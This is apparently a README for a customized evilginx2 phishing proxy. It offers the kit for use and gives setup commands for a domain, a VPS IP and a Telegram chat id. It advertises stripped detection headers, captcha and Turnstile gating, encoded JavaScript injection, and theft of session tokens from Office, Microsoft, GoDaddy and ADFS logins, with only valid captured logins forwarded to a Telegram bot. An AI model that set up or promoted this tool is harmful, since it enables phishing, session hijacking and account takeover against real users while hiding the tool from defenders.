# evilginx2 with telegram feed
custom evilginx2

All evilginx headers removed

Added support for only valid login with captured tokens will report to telegram bot

NOW CONFIGURE YOUR EVILGINX...

run this before you further!

config domain your-domain.com

config ip your-vps-ip

config chatid your-telegram-chat-id

Additional - Cloudflare turnstile/worker's dev, Google captcha, Hcaptcha, etc.

New evilginx3 features *

grabs token from http headers/response body. 

use sub-phishlet (multiple website token with 1 phishlet) e.g office,microsoft,godaddy,adfs.

encoded javascript inject!

webSocket connections are now properly proxied.

